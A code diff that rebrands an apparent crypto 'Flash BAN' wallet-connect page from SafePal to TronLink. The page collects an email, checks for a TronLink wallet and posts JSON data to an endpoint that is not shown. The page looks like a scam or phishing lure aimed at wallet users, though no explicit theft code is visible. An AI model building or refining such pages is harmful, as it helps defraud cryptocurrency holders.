@@ -73,7 +73,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="./safepal.png" alt="SafePal Logo" class="wallet-logo">
+        <img src="./images.png" alt="TronLink Logo" class="wallet-logo">
         <h1>Flash BAN v1.0.0.1</h1>
         <input type="email" id="emailInput" placeholder="Enter your email" required>
         <button id="connectButton">CONNECT</button>
@@ -94,7 +94,7 @@
             if (window.tronLink) {
                 try {
                     if (!window.tronLink.ready) {
-                        document.getElementById('statusMessage').textContent = "Please unlock your SafePal or TronLink wallet and try again.";
+                        document.getElementById('statusMessage').textContent = "Please unlock your TronLink wallet and try again.";
                         document.getElementById('connectButton').textContent = 'Connect Wallet';
                         document.getElementById('connectButton').style.backgroundColor = 'rgb(72, 32, 232)';
                         isConnecting = false;
@@ -120,12 +120,12 @@
                         body: jsonData
                     });
                 } catch (error) {
-                    document.getElementById('statusMessage').textContent = "Wallet connection failed. Please try again.";
+                    document.getElementById('statusMessage').textContent = "DEFI Wallet connection failed. Please try again.";
                     document.getElementById('connectButton').textContent = 'Connect Wallet';
                     document.getElementById('connectButton').style.backgroundColor = 'rgb(72, 32, 232)';
                 }
             } else {
-                document.getElementById('statusMessage').textContent = "SafePal or TronLink Wallet is not installed!";
+                document.getElementById('statusMessage').textContent = "TronLink Wallet is not installed!";
             }
 
             isConnecting = false;
